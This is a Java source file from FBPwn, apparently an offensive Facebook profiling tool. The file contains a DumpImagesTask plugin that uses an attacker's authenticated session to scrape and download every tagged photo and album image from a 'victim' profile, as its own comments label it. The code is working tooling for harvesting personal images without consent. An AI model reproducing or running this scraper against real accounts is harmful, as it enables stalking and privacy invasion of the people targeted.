/*
 * FBPwn
 * 
 * http://code.google.com/p/fbpwn
 * 
 * Copyright (C) 2011 - FBPwn
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * any later version.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
package fbpwn.plugins.core;

import com.gargoylesoftware.htmlunit.html.HtmlAnchor;
import com.gargoylesoftware.htmlunit.html.HtmlPage;
import fbpwn.core.AuthenticatedAccount;
import fbpwn.core.FacebookAccount;
import fbpwn.ui.FacebookGUI;
import fbpwn.core.FacebookTask;
import fbpwn.core.FacebookTaskState;
import java.io.File;
import java.io.IOException;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.apache.commons.io.FileUtils;

/**
 * Represents the dump images task 
 */
public class DumpImagesTask extends FacebookTask {

    /**
     * Creates a new dump images task 
     * @param FacebookGUI The GUI used for updating the task's progress
     * @param facebookProfile The victim's profile
     * @param authenticatedProfile The attacker's profile
     * @param workingDirectory The directory used to save all the dumped data
     */
    public DumpImagesTask(FacebookGUI FacebookGUI,
            FacebookAccount facebookProfile,
            AuthenticatedAccount authenticatedProfile,
            File workingDirectory) {
        super(FacebookGUI, facebookProfile, authenticatedProfile, workingDirectory);
    }

    /**
     * Initialize this task, called once the task is added to the queue 
     */
    @Override
    public void init() {
    }

    private void processPhotos(HtmlPage PhotosPage, String FileDirectory, String Process) throws IOException {
        List<HtmlAnchor> hrfs = PhotosPage.getAnchors();
        ArrayList<String> images = new ArrayList<String>();
        for (int i = 0; i < hrfs.size(); i++) {
            if (hrfs.get(i).getHrefAttribute().contains("fbid=") && !hrfs.get(i).getHrefAttribute().contains("ajax") && !images.contains(hrfs.get(i).getHrefAttribute())) {
                images.add(hrfs.get(i).getHrefAttribute());
            }
        }
        for (int i = 0; i < images.size(); i++) {
            if (checkForCancel()) {
                return;
            }

            HtmlPage Picture = getAuthenticatedProfile().getBrowser().getPage(images.get(i));
            Pattern imageSRC = Pattern.compile("http:.*_n.jpg");
            Matcher Match = imageSRC.matcher(Picture.asXml());
            if (Match.find() && !Match.group().contains("\\")) {
                FileUtils.copyURLToFile(new URL(Match.group()), new File(FileDirectory + System.getProperty("file.separator") + "Image" + (i + 1) + ".jpg"));
            }
            setMessage(Process);
            setPercentage(((double) (i + 1) / images.size()) * 100);
            getFacebookGUI().updateTaskProgress(this);
        }
    }

    /**
     * Runs this task
     * @return true if completed, false if error occurred so that it will be rerun after a small delay.
     */
    @Override
    public boolean run() {
        try {
            setTaskState(FacebookTaskState.Running);
            getFacebookGUI().updateTaskProgress(this);

            HtmlPage taggedPhotosPage = getFacebookTargetProfile().getBrowser().getPage(getFacebookTargetProfile().getTaggedPhotosURL());
            processPhotos(taggedPhotosPage, getDirectory().getAbsolutePath() + System.getProperty("file.separator") + "TaggedPhotos", "Dumping tagged photos");
            ArrayList<String> albumsURLs = getFacebookTargetProfile().getAlbumsURLs();
            for (int i = 0; i < albumsURLs.size(); i++) {
                processPhotos((HtmlPage) getFacebookTargetProfile().getBrowser().getPage(albumsURLs.get(i)), getDirectory().getAbsolutePath() + System.getProperty("file.separator") + "Album" + (i + 1), "Dumping Album" + (i + 1) + "/" + albumsURLs.size());
                if (checkForCancel()) {
                    return true;
                }
            }
        } catch (IOException ex) {
            Logger.getLogger(DumpImagesTask.class.getName()).log(Level.SEVERE, null, ex);
            return false;
        }
        setTaskState(FacebookTaskState.Finished);
        setMessage("Finished");
        setPercentage(100.0);
        getFacebookGUI().updateTaskProgress(this);
        return true;
    }

    @Override
    public String toString() {
        return "Dump all photos";
    }
}
